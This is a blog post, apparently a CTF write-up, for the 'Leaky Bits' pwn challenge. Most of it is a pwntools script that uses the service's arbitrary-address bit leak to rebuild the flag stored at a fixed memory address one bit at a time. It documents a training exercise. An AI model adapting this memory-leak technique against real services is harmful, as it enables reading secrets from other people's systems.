---
layout: post
title: "CTF: Solving Leaky Bits"
author: capitol
category: ctf
---
![bits](/images/bits.png)

##### name:
Iran - Leaky Bits

##### category:
pwn

##### points:
100

#### Writeup
The team from [xil.se](https://www.xil.se/) have written a challenge that's called leaky bits, and as the name implies it's all about leaking the data that we need, one bit at a time.

Drip, Drop, Drip, Drop.

Play the challenge here: telnet ctf1.xil.se 4500

#### Solution
```python
from pwn import *

context(arch = 'x86_64', os = 'linux')

# reads a byte from the input address
def readbyte(t, addr):
    bits = ""
    for i in range(8):
        t.recvregex('Where do you want to leak\?')
        t.sendline('0x%x %d' % (addr, i))
        bits = t.recvregex('look: \d')[-1] + bits
    return int(bits, 2)


with context.local(log_level='info'):
    tube = remote('ctf1.xil.se', 4500)

    # a quick check with r2 reveals the flag location in the binary
    flag_addr = 0x601050

    bytes = []
    for c in range(30):
        bytes.append(readbyte(tube, flag_addr + c))

    print "\n\nFlag is", "".join([chr(c) for c in bytes]), "\n\n"

    tube.interactive()
```

Coproduced with the [League of Extraordinarily Backward Engineers](https://ctftime.org/team/32182)
